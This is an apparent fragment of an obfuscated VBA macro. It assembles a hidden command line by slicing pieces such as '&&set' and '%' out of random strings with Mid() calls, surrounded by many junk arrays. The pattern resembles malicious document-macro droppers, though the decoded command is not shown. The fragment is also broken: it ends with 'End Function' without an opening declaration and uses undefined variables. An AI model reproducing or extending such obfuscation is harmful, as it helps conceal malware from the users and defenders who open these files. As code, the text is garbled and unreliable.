NMOok = "Hb9EUG0Mks&&setI8A"
AGHIWWE = Array("iBpRwFCi", "boWIhHjb", "zPCiptwN", "TaJKmhSh", "macrKIrC", "QcBBQmZV", "GKvptHEo", "DcwXwrsu")
NVOzES = Mid(NMOok, 10, 6)
OnhXfzUBwMY = Array("HvMNUKGi", "qEqqjirA", "DDMAhBSZ", "bZEKwzWo", "AOjlwYcY", "dYTKsAap", "HSHcqnvG", "cnmvFwlt")
jzqRYEIUo = "Huz 61nXE8SFmMzP7bIrRFM2zKbKv7"
TaMbjUhCwAL = Array("YZJzufPj", "rurJnonW", "EPTbAuii", "FCEHYLJI", "lLZHSkNZ", "qSdlzzJM", "TPajYawi", "uarsaHIj")
FjkzmXzbZk = Mid(jzqRYEIUo, 4, 1)
UmhjQE = Array("unclRWQj", "znjjLtli", "rhDszzmU", "wmXZhzPK", "XNzGPKpI", "AnKwjbhI", "FGzUfoHw", "BHmiwrBw")
soPEwlr = "6Y8jpr7KIqwn30pOKPFRYwnQz0Sdam6BiWGF%!!%oia"
uidwIzI = Array("jvApWfEr", "CnHjcwFm", "XZTCwMuL", "sHCdZFKf", "zamIOdVN", "NsFSLdAq", "JjjjCnRU", "ApwPdaRz")
LRtKhfWOdU = Mid(soPEwlr, 34, 7)
AwLXw = Array("uBYUsXiK", "tAwfsGUw", "jLEIVRPJ", "CpQMUfTB", "iCkossIR", "BpoSDPSr", "tRjHGSJd", "mOSDGVqN")
iBUjQS = "zBDPE&set %hiDI6zR7T"
bczSpaN = Array("kZPXFUMp", "vLnwihPz", "tVTJwRzJ", "caWHwstS", "wtNNVaLm", "jzKBbETq", "LQBJastT", "cFvfwEqD")
CHOrDSlvim = Mid(iBUjQS, 6, 10)
jRoGZXYDAk = Array("UDdzlQUH", "fIknBhOw", "DjkzzTfC", "jrlaGnXK", "YdbtjOnY", "MAlwnkzQ", "GwpFNOBB", "XbPuiuBs")
MRDhjm = "HkYaM%=qNjOjE5Xwiz"
NdtUwl = Array("tYQQzSwW", "lzAMMznu", "FwNECjCL", "wbvRGItF", "Htcokjij", "mWZWjKLa", "BKFDojMM", "VESWWhPd")
ldLhEbQStLM = Mid(MRDhjm, 3, 8)
noCqzf = Array("tvpAMcQd", "KmvJlzoE", "hFtHHVVA", "vBcPovsX", "tUzWFLTt", "GvIWMBwf", "CksLVhWY", "aoEKABoO")
VZPzmz = "IaYIzw4ZBFECKhLuPir8zn=EiiQwWzRmjW"
YGPmG = Array("pWDPLwsP", "CaoWaiQS", "mjsSBVBs", "ophXFLti", "PRQBAwLf", "thzwnbiq", "TWbCUAST", "VKbWRVJr")
drvtXPaOKj = Mid(VZPzmz, 23, 10)
WizVQus = Array("QMYKPtjX", "QMuXBGEA", "KdGjFLno", "VAHWEzXY", "UluGHuaf", "vikFYDOX", "dmwCWbzF", "YkpOmMST")
auJPUs = "U5D4wvTVuYvJztrz4zosHilKsJalNaYI"
HsntSiSb = Array("cEYRzMwO", "oEpDjnBo", "zEYDfCiQ", "owfCWMzE", "zsqrmKkq", "KIfoRDfH", "wYQirXja", "VIcDjwsb")
EQlImu = Mid(auJPUs, 7, 6)
idQIfKYcjz = Array("zAwNpYtn", "SwfwMHnA", "wPkJcnGw", "AapcMCWb", "XvHaCjbj", "UYHTvLck", "DIXTsGGL", "uzNOjQbP")
LoNzWK = "lukqT6JzwdTwiC"
FHlhHu = Array("RdtlSwqi", "jcoiFvBK", "OpfcMFuL", "iOpTnvji", "zNJqUtBo", "tnNaZKQO", "kkESskVL", "iiHDHWrk")
HpLEJnJjzzS = Mid(LoNzWK, 7, 4)
hRzsuAzmTh = Array("XfHTMRoZ", "NQbSIDvv", "NuUruBWV", "YtJQMfzw", "YWlwFjOr", "CMvbTNfT", "ljStDNsW", "JlvTIYNi")
OwLiK = "YRzBAZHoYA7UjiZrGF          Bt"
hdPLLzv = Array("pTHAtZbZ", "RPCKRJcv", "RECUjMaN", "njNzYwvK", "jZlMfntj", "cjszjosR", "rkNZijcd", "ttMNMcAU")
XmRupCjwBL = Mid(OwLiK, 19, 10)
lszdjwD = Array("KMcOlWsY", "wLIHnkOv", "itpzrAkI", "iGrHYpVp", "znqoTEca", "vjibfnon", "FEJJPmzK", "bUjfikAI")
azARUsr = "ffOKfcoiomEmiarOCQ%kJzf6D6Wcvmi"
ClJJO = Array("BcQYEOzm", "ctpVprfz", "siOdNilt", "LNlcAMWQ", "DrnQXSvD", "ciTMwCIU", "KOTctDJT", "qXMqcWlQ")
KaJdmtVSGbS = Mid(azARUsr, 18, 2)
TRFcho = Array("BrNwulon", "BjTwHPLS", "wAXOHDfX", "lidjFiir", "hjLzSMYi", "YlOosnqz", "RcQwFoYz", "LpLLHIhX")
YEUFjOhcjFU = "jBVi6LnR0RvccQZYwOiXs8vLFMLEioRIF5VW1QFH"
QLYRrolrVzK = Array("QjZlroaS", "YSVbFTrH", "nGzoJXLG", "DcNjRPEa", "rpRSzpXj", "jDKkwjPa", "HWjuHLLt", "XSiOarBI")
tcvDlH = Mid(YEUFjOhcjFU, 10, 9)
IivGviBJMvZ = Array("kvrKiWXu", "AWzwAowI", "NHXBTPBs", "jOVSvjFO", "ZPzHhvjF", "frKiBYbO", "VGWiCSLU", "twdTAEzU")
tPOMQdcwqc = "b63awbLazTjfkGXjAffcwiQwn6ji3MoALarFmTij"
MQKWKwmCMhv = Array("ouHQCuVX", "FZAUrBZC", "RfWwIWlw", "QhozkITU", "lGidSmti", "sPccvzDt", "jhSBBCLR", "IKAVFYmz")
hWuQHQ = Mid(tPOMQdcwqc, 23, 1)
UpntKwfcGQr = Array("MTCLEHUO", "OshzAidY", "rzZtHRYz", "bUbwMuEn", "sjcjCUsA", "snZXYZCw", "ZNmhBwTv", "uFjkjYBT")
ZjMVmQhBQ = "K&&set %Zk1rJtiYKBtaitidwtWAa"
GjioiMYaGTf = Array("ViHwQdYl", "HYUzbjNR", "zuCMNErD", "XoijOKoz", "zoHzwmpj", "qXwGWjcr", "IbFphXmQ", "qEbcurXz")
pVKtU = Mid(ZjMVmQhBQ, 2, 8)
XKkoVVW = Array("SmPPmlAK", "VfEBCImb", "tVzCjPLt", "XjAQbWKW", "tDrJDHNY", "ihocfFlG", "NPJFiqjD", "aWsDkkjz")
QfVhObIJnp = "3hFEZOCjpI3 4vInqZMUP0fBqq"
PjLStHB = Array("vwOVPtzZ", "MdCCJqLa", "MlBbYcdX", "ztojJKDP", "iftISCrI", "jjubVsjA", "MVSDHoZS", "TrXWFOQC")
wQzIb = Mid(QfVhObIJnp, 12, 1)
DEfNfWvJ = Array("dWoFPjMW", "bffKNAYF", "fCUbwlfQ", "IksDFiji", "vslfHFpr", "YucoEhXG", "CiGGEYus", "rYwfoIQz")
wIdtzARkpZs = "iwwBzOhqNpmIDYNS1llIjbYEj80c"
ZkiKoBH = Array("TuEDUfSw", "GOiBDzoF", "qTzjDDkN", "WUOTjsIc", "liJFXjPH", "ffkhiOAE", "wDiuFnzP", "JrhARzPO")
aTzBaLwHGt = Mid(wIdtzARkpZs, 4, 5)
WIEGa = Array("pcbqASmE", "kNbiptwY", "rXlNIlbo", "hbEkihuj", "ilYQGsRX", "fHhdAbkk", "mwiqvRPE", "BmJYOCWC")
GtHaGiNzBaj = "OR5Oo9FSfMGqFmiR4SwAELNMDjk4FI0RZRj"
twKzLo = Array("fqWXtCkw", "KGLuVjGz", "QVfpZcjf", "twsrTnFm", "bosjwwfz", "HzodXMwn", "VfakwXwC", "GqdzJsfW")
zwDzGNCr = Mid(GtHaGiNzBaj, 8, 4)
VVFALKUapFw = Array("AWIzbBJs", "uGJlXIPD", "zpSaiiDj", "SkvhjVbT", "OAOMTwiM", "PnMXZSTZ", "BrwwjjHR", "TbfrGcMY")
vZnNdHGirYq = " TsL5zRjRYsEHcL4!!%sJkzoH"
wCjRKVW = Array("TjAmztGl", "EALbotvE", "rHjwilGb", "SWudbrdD", "tsfzDTIF", "SlOYStPi", "nKonbTah", "ZYTdzdJN")
aNPAcsLmw = Mid(vZnNdHGirYq, 17, 4)
sultCuquj = Array("qTKWdKmm", "GXLGZZPS", "bbYWlmsb", "HzPfVAEf", "FnaVMqXX", "KKzwfDFI", "zZWSYiVE", "bjPjuHQF")
rZiYhzpHVhV = "RVFk UwjMOLl0q"
smYEjli = Array("fUtiuhTz", "VzYXYMzS", "oYfwadiZ", "LjOjJAvY", "oGJPiBKq", "ZfULumca", "hMXzdzOB", "qUSOTkoV")
CWRXwDoG = Mid(rZiYhzpHVhV, 9, 1)
SaqCVl = Array("ToQVjzNm", "swHmAbjk", "mhOFITBk", "qUdDqDTm", "sWjBQoLR", "hkvokXjF", "YtdpISKA", "mjfLVJwo")
sWljMj = "8JObVbj7RjbraYrDMLN8tRoCuSVlXtK%suwTu"
VOIzTiqRNLR = Array("RhMuhTHj", "lRRRfikF", "OobnzdjR", "mwSPcMHK", "NZKjovSN", "rtXrwOsw", "RwoHmRon", "zuIjBrHZ")
RGcOcqow = Mid(sWljMj, 22, 11)
jCwFEnDG = Array("RiCKIlWs", "RFZsNFNZ", "QBVpktHB", "GFoImdns", "jSXtRhPD", "XTNcQAqA", "hzdJJOjY", "aBEDwNFo")
KMuZRpKPw = HICvOZMrL + hWuQHQ + tcvDlH + ldLhEbQStLM + EQlImu + pVKtU + HpLEJnJjzzS + ZMJtpjMA + NVOzES + qfMXJzEkc + jHfHAqiF + AolDAEBnA + EukVph + CQNjtpSqdL + CHOrDSlvim + Nshim + wIZHEQIwd + CWRXwDoG + aTzBaLwHGt + cjwCDDJ + BkJjMoAiUAT + zwDzGNCr + mCGbvdUqfwz + XWZiLzjw + FjkzmXzbZk + IjGNz + RGcOcqow + drvtXPaOKj + LDoRrUwcbjR + KppSPXIXCum + ZrwBNIi + LRtKhfWOdU + jiqZW + KaJdmtVSGbS + aNPAcsLmw + PfQuHhzMYK + XmRupCjwBL + bljFrUhVt + OKovKOzO + wQzIb

qDQHpBj = "ikDPXHGSbtMhHVzAFptGLfibzdSiwnrRBFKUFJuZEcJlJpQXzlpBjKaNwGAZGNWoBvfBKfuwvTBjVzSINCo94Y1Zc43oS4C"
bJCWkTK = Array("PUvijPNR", "kPTQoMhi", "AfsHbtFK", "GXQYBEEv", "EUzwSBnF", "tVzcviCD", "zTGzDMhW", "OkXJwoPf")
Pjizp = Mid(qDQHpBj, 8, 74)
zkTvHhJkpfi = Array("JqfzmcIi", "XrQUfuvR", "UwwKoSaz", "vjzMOObw", "ZBNjECLh", "qYdNSNjU", "UHmirOuq", "QfBGcvTJ")
iwblmbScQwR = "PzhGbbCAphjzjYZRqDwGlNOflNVwGTpHPHCBiBfJnfjh82wqb1uTjAm6iCkPmGYcrKXNn91w1PoTmw"
jFHKFO = Array("zKCIsAkH", "UjwnHqVt", "LlXdQLwD", "TXbzzjad", "NrDrouMa", "mcjmnlEa", "HBkRlKFm", "LwpUZnIn")
LsZrEJt = Mid(iwblmbScQwR, 2, 42)
jMMcoOIw = Array("jHAfKsIn", "XMfqAbsL", "CwMjoUrX", "kOqzzBOU", "osjraucd", "mBNBCqDF", "bWkDWkZL", "QdvvCJnW")
CFWwzhWs = "WWi3NGbwHUNuiXBWrAIvGfOwOrnkuNiNrmcuEjIqkWSuwhVqCcHjIYzDDkYNjaWvbADsvGRIsRLjNUCjWziSFL0fkIniq2n38c9ACiFi84BibEVc"
UXtQR = Array("jTVDKKXc", "OVLSRRzq", "wTFEBPat", "XYjnARiG", "HPDpsiOa", "knCmDXCZ", "KmCkZMuR", "tcflbjbz")
PkGhWcZhinD = Mid(CFWwzhWs, 11, 75)
cSdkDVKXT = Array("vsTjhvVd", "NMBdQDlU", "GjHzqcBJ", "EjsqMRfh", "HNsazdSm", "mYLkJOhY", "kIPQHOpT", "qKcADfRw")
MUdOPi = "2FYLmsBhHPQWtkKKbUIKfrYOjhkVHUrzDKNJkJJWWrZXKJhLAPQQrLqaqFcFIjamXTSiXBaSKlnnRAEZzYUrEbFrTmSijDOqRmArrwowozGFYDIqADFjLiiwNbOkjvlGWwWfANiBkVCGUzTQibidwfiiDDdPjDPtMzjbjdqnVEzqfbbNHzCT0nfa"
zdCvr = Array("qQQQYYKk", "ZjdTNSJT", "rrfaqQGP", "mOFYLpiw", "qHnYmELr", "iKzSVwmE", "vSkYMcVa", "KBdKTmYk")
FKbwoKORwH = Mid(MUdOPi, 4, 174)
qhnIJ = Array("jRCHoroW", "zcYfSmAo", "hqiUMhvz", "WMbvTkmI", "OCNbdwRu", "qtUdoCUk", "PsuWCzPz", "WFlcPsCM")
QljsOjWd = "HRifLRYkw3qMkOFoJCisCHdukXYDTAEaHpkEHHDZEjwOs"
woqZhdi = Array("iUTzHoCE", "uWXjOshH", "cRPnvGTO", "BwcDdjzv", "CXODGmXw", "WHlwAjvS", "IQjoEwXX", "AEzKLwbK")
ulYsMwjzKS = Mid(QljsOjWd, 11, 29)
ljwvOOz = Array("QwvFaDXv", "bRIFNOcw", "FqcnSFlF", "hOwCLHno", "mOHotBwF", "QmqsXZlf", "nYLjUYMK", "LqYMGUkT")
MaGcjb = "5X2GMlBFDFpaNzffhPAszadzkcvDlAdjiabYuiidVOaiqkWtwCSQRSBUuFJuUfjdsOcnVGlwlXWjzwJzGBFjhMOPZHioZjHnsvEHm4qhBbPdUrS00"
WlNpCRc = Array("LiQCvoph", "mIGqFiwN", "QHimBzdD", "kOKldDBQ", "dJdolulK", "kRRfhmow", "rQRtLwUL", "ANRjdEEj")
bcoroz = Mid(MaGcjb, 13, 82)
uKOcLJbhJ = Array("itHuuoTw", "WPvHPDZQ", "oXKNDkTR", "QNodNADR", "rNIlbHkC", "HMfoSCzh", "wawEnnct", "aqihAqjW")
lrbhlDFlP = "iOPtdtSvMVGjwSOwCHmGTIjZhAshSomTIcnjFrGlMWjvjWiIDzaQQzKUocPwjGzFAhaWiiqLBAuwblqKWjiVNWDLRTudbJntwWSwkWoTK9uE"
oXOqEL = Array("BmmcGNsK", "JRTaVWBf", "JjuhTZNY", "pmXKQatH", "ZswhTnRi", "KkcGMrwi", "AismpQlc", "YOmUqhti")
BShBjwsDrvt = Mid(lrbhlDFlP, 12, 83)
QFPEwQMuc = Array("mWXzadai", "RMXqjMlE", "olfLwSVV", "lYHqkNKl", "EHGYMicO", "rYzwUGPY", "vCulXjST", "BBNBVkwE")
zjicdjLQit = "83bwKjwXMkPEXzXiDzPJi8Lw3b2mkzfQcBsEiDAlvjrdhAjSKwuXFtXPjUdVvKmirG"
UKzNiAbolPz = Array("FwIljPvL", "BNaDmMfB", "lzYlhGMr", "wjMvSkii", "vSoCitZM", "TGPqjzma", "jIWHhjIw", "kRpwCAsQ")
XkGFpCS = Mid(zjicdjLQit, 33, 30)
kiWhsTpc = Array("UtsCYMFS", "odMKlpPF", "osDKRuGi", "sREAAwXP", "BzIAJdrp", "jNItzqfF", "bPRQDKDZ", "nOKHHFRq")
mSwIF = "9650OdvbdJSqlrUJilCUOFFtWsZkYWXioYpSGjzBpmsnndDQuwTQjhREhlKVELDHmkBNBCDClAfbMSFtoIpZCGBHHlkUWizdjlADbqOsvRijBprPfRjvWdEfitGQRifHDBsbSCoDIQCSDtZjd0NNs"
pvHLZ = Array("JirJIjGT", "zQXGOvRa", "tOGZRppP", "NKwoRwIi", "AMYjdDPI", "chHhEOtX", "PWLSwwAU", "sbvwnSCA")
vLcDUq = Mid(mSwIF, 5, 130)
AwUot = Array("CwMsKUEi", "lFUisbAb", "iDFLctif", "vGnzISwm", "rjSQVODp", "oViiOUMY", "siAHzbVI", "ThzEhFVS")
dEmiCrEp = "E5KlpfiTOo2Bm0GnokAQHqMimCqDlzRBKzcTsBvtMCmHKGTjGBwckdztZFGYjdkHNnmJUGLDCGEFDEXfiGzjhjHa4fap"
bZjcjzrAhr = Array("OpjlLskE", "ASGYQQlz", "LqIFjjWP", "kDpifakT", "mBkwNKJE", "LwuqPbEG", "vhPtdRJi", "SRAIDFZa")
OXGsmkQbb = Mid(dEmiCrEp, 19, 66)
joMqltKwKF = Array("cnFaivqY", "XuUTWjEv", "RCmLiHQX", "tHLFAiff", "mlYMLMBU", "FJqzmtvU", "zvBvIWAV", "WhhbklXp")
wtVrSlqPow = "WcACLVPfWNiLLIY5VWqWTG4fv4XfKGKBEvzrBmtVWhifzWLFNKzLIfYBrZkBQndiuDmUbfKRtzjidlfMmhSAJztYWwAsO3vzpY"
ohnaWzqEB = Array("iAYAuOGv", "civqUlXk", "EBDOpcqB", "oAavDHEd", "JCRYvMkG", "wOqibzBV", "tfCordTB", "JXLtoKsV")
SGwSbipF = Mid(wtVrSlqPow, 28, 64)
cliBzwI = Array("CpMVYWTJ", "JbDwfRwS", "QrdTrjhv", "EQjYSzwD", "YiXiMUOu", "YALwYTMi", "UEKTNXpW", "HRQHqurJ")
BvHINZ = "54HKithllJNFGUfGtFRjwviaJcGtKAwUUSwhYDWzAZtqUXjdBACdCzfhGjBCnoalKsknXwhqiUjXCsGlscsKzVRVmPbrBUKMzHfbnwFCSMuiSIiOaPJLwPnoaOAIXpoOKUYuMfwwWpslTpkKK7czisnRwX"
bojthj = Array("zHazciDB", "dtiTCiOf", "ToiEpojE", "SRnjjNus", "KYCfzVMz", "qErwjJvS", "ojFzXNRI", "YWfLvURP")
EEjRfi = Mid(BvHINZ, 3, 138)
hnCbUEX = Array("fcFRLQXQ", "DHhttrTq", "zQadwifB", "DmcQwvJZ", "SwOkmwmh", "wdjAnYTo", "htFUqOdz", "zDOYnGSH")
kGCmoUTc = "48ZAF9cW3TLGCrbPHOHzcoSLGEWOwizSIcQXJzUjzGwQHKDlsBOiwWhzrqmYuoaQttzaaDGJuXzVrCEvAlWuQTVmuRfSLvpIjfXONdKovEjYWLHplqYJSfAZXKfJXnzwiqpMiqiWahwLjwQjJqhVXfqAizqCwBQIHkqfVvKvHBikjppauwL0"
RdVkz = Array("KFAbYtus", "XzEcjKCO", "NtizKXNM", "jGIBoChw", "ZcbMGENS", "BGijjnVm", "bmhBnKJm", "snvRlsDU")
rdnfLhh = Mid(kGCmoUTc, 11, 168)
jKjElYlLCOv = Array("fszVoZHE", "dozAXjzb", "iVZTLdvU", "UtipuJiu", "AvIFjpzb", "OjwlSGjl", "LvwGhoPB", "wiAuuRJT")
qlIwjPUvnY = "ARnfM206Mdr7wbjCikMRlKwPjUqAYvwfdYfXwkjCvRNoGXBNrMWXKYCELEoaViaAZJPMwLDtBKWUzKJMTdJLZZVEVbMuwJjQqMOzHpRfIdWzBhHBvbGrVObAoKqUzJwsWGukGdi7hQ"
iUzbHLtmrw = Array("YjYYkjMT", "EzOEVNXL", "HMOKFCFj", "SjWAKYmj", "XnEtiChD", "JkKliPrm", "iAWLvdEW", "drFAKLIf")
jEiFWn = Mid(qlIwjPUvnY, 14, 115)
ovdbIwMuT = Array("ipCaLAIU", "SpYwKhDO", "qGHHQRqA", "OhdwjJQo", "YlwWCXCK", "tLwddCaR", "jVDOisTM", "zBMdXKnJ")
zDvrwCiJi = "XtMYPqzHDfTcZWirYzZWRURcvBrSMRqtNwhMQEvdAhCzOPdluCLXzjBjmwMotmvpNaPdpWaTEvVkRSNfXGXJFSthuAZSsGkOlMmnAAvYbsTDKROUkjQnOlkujhiowIazLGwEjaiXKwhNzpWcmFhLqwzAcrHSRGcTRVsDTJoKCscQDWvq8cdvwmwGNTN8T2DV3K80d"
JfaBahHN = Array("jQZOkrKl", "qMLAwpTJ", "FRZKfdiw", "ISjXFOpH", "wRjsSYFd", "olRjBYBD", "wCviAOXF", "mdFRLnfc")
znhJTm = Mid(zDvrwCiJi, 11, 166)
LdioG = Array("SCtNtDUj", "GVqkvCRA", "DGwtZSJc", "BsHuJDmZ", "KhSZpRPl", "hYUTJsmp", "VzXIvNYz", "tRLBwaZC")
FwONaEGZH = "IO70MlrSCUbtUOtabSiLlnFcauUNcYBiOSRjrzzEtzYhiMLtzNCNoqUmubJWnEqiSsiBzJjcSdRlPXwNiaOOVouYzfoPpcRpJtPliJwpiauKYjWWdwoMpbIiwFDSUTmqMccVIMfZiZkvtjAOIRltoEzilkncGiUKnDwvGBORQPhQfj2bZ3zuvTnmLNW4p6V8GTV2TBi"
BqfGAOk = Array("zhCBYVbN", "GUrkhZtX", "iEiJbwPk", "GkniiZpw", "lqOBEQYE", "vizaYBKJ", "QUAsfHjw", "SRunizjh")
WaFYn = Mid(FwONaEGZH, 8, 165)
jGpFiciOZQC = Array("cVoWiwOz", "fBsDtBrQ", "kPGwnkmd", "iAAEjUDK", "AscWpWIm", "GCCMjHRw", "ZWsEuQls", "jKsiwKRL")
qnJVkIsH = "kGYOJWj2i3sujKzqirizVzJUSrGVjOJONTqtGPIrsBosMMdLqLNnWNKvnaAKcAODwzhQTEjSjnEULQIGVRzbdsom"
KouIdzdv = Array("XlDTJJkF", "XLwOrSEt", "RcwVbQXb", "rNYEmEkM", "lzYfMcLZ", "iWdnNKwk", "bhNJaBAG", "ObcvlfSS")
MjDIlhAmP = Mid(qnJVkIsH, 12, 69)
IkSHK = Array("EQBktjEG", "foHrkKlV", "SGhiWQOV", "JOzjjDRV", "nQBbkNjW", "jHZvRQwU", "jOcBwMZn", "CfbilXWb")
ZfQZTszM = "8JhZTfIpJ8wmWcsV3A3oVKkzikM87tnvWKjRfuXTKPzqsZiYtqUhapdfBGYMZE"
rbiEMUobYuD = Array("dzksLIHD", "fzJTtRic", "uGUPhajz", "ajUkCvMk", "LNzNXZIL", "lcpbawwf", "jNQHrqDD", "QkSioXAj")
APBIuPwHIL = Mid(ZfQZTszM, 30, 30)
joMZV = Array("hsAbXnzN", "wZDTihZC", "wmXEksvp", "kMZnINvF", "jqWRutHa", "vRwdKHRT", "TsfVYjQp", "zKqLNLFk")
KrRrKrbz = "uwQXiDXLoPIjjhLcwZjiYEUwPYYjnajawLarkzVWRPTOLuEGcTz9pjfSpMzjSFMsnQKvfT1Ol"
XzhMKEp = Array("wrCEPMqp", "nmSGzQlj", "czYnzHzl", "GjZKMumN", "GnjnSiGQ", "SDzEdiPG", "ZvZBOimp", "tQwinfct")
nbMTHJtIkc = Mid(KrRrKrbz, 2, 42)
kEiosKrrCt = Array("mQciOXoS", "bpjjvKIM", "dkbSiXuQ", "BMVCwqsp", "hqvvWowo", "AcYdiVjV", "dIskrvkO", "WLcCBmWk")
LfSWNvu = "ZB5Zuu62wXCl8IfocCJAobikFdaRtdXCEicVCwwYnRunBp5zHh"
ZwjQwLpUdb = Array("lOhpRiiq", "iTmDmFmz", "CJkoBOBE", "YHlVvNKa", "hFzOwwui", "VnbzUKhl", "ScvGLhQX", "MdRJwMvU")
uVzJIj = Mid(LfSWNvu, 18, 28)
uuGzb = Array("ijTHojwN", "wJjsctLH", "NusKHJrO", "fpUBsfXU", "LmcdZXMZ", "XDWlcjmL", "QDdJTGOU", "rEbwPwVR")
tAURwdJUp = "6mTjLJidikcN6uzvswiBpQjzitooIC9VBz"
vikKObUUc = Array("kuOAKjGp", "qJwrLwcf", "tUjATstP", "jTuYcaDZ", "rMQrLrjD", "AtptBlOM", "fvjuVSzr", "AwQqmiNP")
lmrqp = Mid(tAURwdJUp, 20, 6)
FDKbfdzoli = Array("PJWjLbYZ", "TIqcNFlm", "tqcbBpzO", "FlMTHDYw", "OMuFfDAS", "iJdAmZsr", "jGjfDwca", "KHbZOFSQ")
UPNKKiORt = "IidWFGXbuBwHiYGOPPDNtDlEawbdriiPEKjNjrvnYAqoOOFFPzGoHEarrXjIiujPXjDTptiXTPotNwpLrWOsXqHAksVMHnIiRaRiLlQWUiUrPjiuhXRIfqrhYCizXRPjGKbmfHAFFsXpVQlDNafkVAzaikJIDTwCSolFErPZjpwWzr9fSmZmDD9L3zrB8C6"
vttoEW = Array("zmKuoUNb", "DbFJKnXw", "tEpnAwop", "OXiikNbA", "jWtovARz", "duwDKjrQ", "YbfUOXiw", "wUjQmfrq")
ZFvpTE = Mid(UPNKKiORt, 5, 164)
nlRhsfLw = Array("PjtdNjNq", "CwFPCOGr", "lqcJEMdw", "EoKJfXBT", "FIZldJmA", "EuBqbFvF", "UrWCfPtC", "DvZZZDLf")
DjSkMDXFj = "7JrJicRajuNtaoRwtwdlcVFRtVoFzBHFhUVikwbNlXcAzPzdAhCaASDMnoWvtaJCunuzjiOvUQzEsFUiYLFPzjFORIuvbjTLNaGJVAwRTGGjTwTiTsWiUuDNhffYnSUnwnqSwKIYOnwsaVvSoMbiJlqTXtcpUXdAlSmfHBjJkzThzKmLkMkaqldLwXvFiSEqJvGIjPKndSwMRJVMGQEHnYNvLGTAJPi"
iFQScRS = Array("WnhdPvwp", "vWmGUdXn", "phjiUhGI", "YPVpPIcG", "nAdKfqqU", "jNUUSPNE", "JEiEtrDp", "jYFzZGan")
fZqcBZ = Mid(DjSkMDXFj, 15, 199)
nlnBwfS = Array("bLCrhZVc", "vUkvYMwT", "wclSPtdV", "AJnvHXzw", "OvzCWGjP", "jIYAzMUF", "PcCPqFWi", "hjrXmZVY")
MCzpiXciuHD = "7ZPBSXGJlMXIfwVoYKALXqztJPmHFsYGVhjDQYWANBdnSkuhDFSKhPRmhIwIkwEtnRnwPRYzoAzWNKaYVEEAaOZFPuVIbNPPzjzAzvSlhTVhRvYXhYnjtDTYrhjVwQXbkhZdUqOzYivbA7SSvrojVK"
iIhEVf = Array("XTSzQhYR", "ArFIrJWz", "uiDwvNRA", "Hkwijcww", "zaShENWn", "wjwmRznO", "aOLzkqZK", "CRqfltiY")
MkumvL = Mid(MCzpiXciuHD, 6, 127)
JzMzJzwqTA = Array("RYUjLCMK", "NkOpKjCA", "MjXpumzX", "UFUYVtNu", "XMPVbvij", "kmupBWKm", "VWwzdWFf", "YzLGiooU")
RadGVdpsSbT = "QrXLDnSCLIRijzmmZ4hwlJzYl10u904wYz1tcoPQA1auHdLRz"
jtzrqHUwB = Array("qjUrhXwD", "TAjAFrYw", "PBwkQZRz", "FuMQnCoV", "qWhdAsbP", "aTjwpLIp", "FWVQrjGQ", "RWlmKjQR")
VlfLmnvDEH = Mid(RadGVdpsSbT, 3, 13)
WTsNH = Array("MvQnkbXa", "KSzmKpRr", "MHGpIzOl", "SzJiIncQ", "SSIuuInG", "JItXNUkI", "mXXCwVMN", "hiUlRoRW")
uKmkSAIbGJ = "LtLT1wkufAIpdXmJFzFToYrUKuJJAWSwicuvKwoqMNqjisrjsDpdvjDXPwzzHCiqBFBtCmHGJPGaiHlSDaQzhoAvZWjOBriKizhcqzjGwiUjccpLI"
jFDVtzI = Array("WoAdkiso", "uiPBUBwc", "sjlujIwf", "GWQYJmCH", "itARDcfj", "TOaanwrp", "tQnBGNTN", "qVXOOTfH")
dPtlE = Mid(uKmkSAIbGJ, 18, 94)
wwrPQ = Array("cPuYfisN", "qzshhSmH", "qNPOoRYD", "jwwAGndD", "hEhHOBTk", "zmzWGDGP", "OLDUFCzL", "rqsjisHD")
jLqjnhEzGct = "oOkovniuT3zoXQhCXntIKabZlSSHtsoUVzaDZiVtQbJQMzpRvuwjVvNHwNublMfzsPzwpTBBMjNjQLNocALwwEwakTHLouHEvJXwwrccsuXphiqkAGwkBjDnQYOVLpNSYJnGoQqlYjFBhJsFdXLhvXDOGjjZdGQChFQYqjwjPNLRbBGGfIsoifWBFZzEjQISio"
ZcrjjYWSunA = Array("FBOkYTOn", "PpNMhkMc", "wMurSQOs", "MauZOraN", "XpUjTqnG", "KTiwGqPj", "baFdVGso", "mVYzZpZX")
tPFUf = Mid(jLqjnhEzGct, 21, 172)
LHjvfRJcO = Array("jblOYMkN", "mQBaAwib", "GJFrhiKz", "KXXUQaKA", "MPYLNStQ", "dVAZkhaL", "aZHulTCz", "RoDBpPzL")
smasjJW = "Pq0PKQJqijbcJiFdkvLEdMdDvCVDnULwUCouclOJzwwjwjdVwEWFjWdfsKfzSHDAoKbqpKBzhCHfPwFPZzGjzFPwZICRFQqqvvsnFnjlDXYjPzQvFQYTATDivdQjIjtRMQkTERJlTVjahjibsHMprXqbsJsbWzdTdGTwMwqoGnzimcBLupnAXEZpaIbuYiOTrMwaPjOIajM2b4"
piiGtA = Array("jSdZidOF", "uLiCJkwX", "tAzjVQHm", "nqjuNPVt", "prMuTwPB", "dDHmqibw", "zmZhpbzP", "LrlrwTri")
Wupqs = Mid(smasjJW, 14, 186)
AQstfKGhmW = Array("GLEfkjTm", "wzXntKrD", "cdOQCVdJ", "VRwfcdSE", "KUbOoXjD", "hAMsNzXz", "fsIBzYhk", "huJThoKV")
ndWDY = "IwGHRIIqSobwjSRjGJtVQrkBlqHtjoCbcQIlzIbEqsJsBuEDnSjWhFzPNFWbAOKdlzUTJfiwipiXiszrmDGNEjuWTsXsmzDchfGBaktHklnsbZjVFiowIzZEFzZTto1FdDQ9MNkYjQDJjzBa9k5lL3HfYvFYL"
RalPuCYv = Array("YmPGPUhS", "chwbpQXJ", "hsLQMDMw", "TvOQfkVL", "vozkOFIl", "kSwMBoMs", "nkzmNHBU", "aTmTFQnr")
HJmhzWKfMaT = Mid(ndWDY, 2, 121)
VorKnp = Array("twGhZurG", "LBtLqNtJ", "rthjwrmu", "ntQRiwcG", "vkzYbYQA", "lUCVXdMX", "GRkZuzQB", "JLtjiZYO")
End Function
